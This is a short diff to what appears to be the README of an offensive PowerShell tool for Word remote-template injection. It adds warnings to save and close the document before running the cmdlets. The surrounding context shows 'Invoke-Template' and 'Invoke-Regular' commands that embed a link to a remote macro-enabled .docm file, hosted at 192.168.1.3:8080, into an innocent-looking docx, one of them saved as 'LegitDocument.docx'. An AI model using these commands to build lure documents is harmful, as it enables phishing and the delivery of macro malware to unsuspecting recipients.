@@ -83,6 +83,8 @@ Saved as, for example, 'Name.docx':
 
 If you use `Invoke-Template` cmdlet you can insert a malicious link within this docx:
 
+⚠️ Before running `Invoke-Template`, please make sure to save the document and close it (terminate its process).
+
 ```
 Invoke-Template -InputDoc Name.docx -Link "https://192.168.1.3:8080/Doc1.docm" -Output C:\Users\User\Desktop\LegitDocument.docx
 ```
@@ -112,6 +114,8 @@ Saved as, for example, 'Doc1.docx':
 ![Word Document](/Pictures/Word-Document.png)
 
 If you use `Invoke-Regular` cmdlet you can insert a malicious link within this docx:
+
+⚠️ Before running `Invoke-Regular`, please make sure to save the document and close it (terminate its process).
 
 ```
 Invoke-Regular -InputDoc C:\Users\User\Desktop\Doc1.docx -Link "http://192.168.1.3:8080/Doc1.docm" -Output Nikos2.docx
